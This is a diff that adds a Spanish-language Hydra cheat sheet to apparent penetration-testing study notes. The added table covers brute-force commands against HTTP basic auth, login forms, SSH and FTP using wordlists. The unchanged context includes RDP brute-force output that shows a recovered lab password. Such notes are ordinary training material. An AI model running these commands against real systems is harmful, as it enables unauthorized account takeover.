@@ -50,6 +50,18 @@ Nmap (“Network Mapper”) is a free and open-source utility for network discov
 
 # 🐍 Hydra
 
+# Guía rápida de Hydra
+
+| Comando | Descripción |
+|---------|-------------|
+| `hydra -h` | Menú de ayuda |
+| `hydra -C wordlist.txt SERVER_IP -s PORT http-get /` | Fuerza bruta de autenticación básica - Lista de palabras combinada |
+| `hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /` | Fuerza bruta de autenticación básica - Listas de palabras de usuario/contraseña |
+| `hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"` | Fuerza bruta de formulario de inicio de sesión - Usuario que sabemos + lista contraseñas |
+| `hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4` | SSH Brute Force - Listas de palabras de usuario/contraseña |
+| `hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1` | FTP Brute Force - Usuario que sabemos + lista contraseñas |
+
+
 ## Bruteforce de contraseña con usuario que sabemos
 
 `hydra -l <username> -P /usr/share/wordlists/rockyou.txt http://<IP_Address>`
@@ -84,4 +96,5 @@ Nmap (“Network Mapper”) is a free and open-source utility for network discov
 | `[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task` | |
 | `[DATA] attacking rdp://10.129.202.136:3389/` | |
 | `[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.` | |
+
 
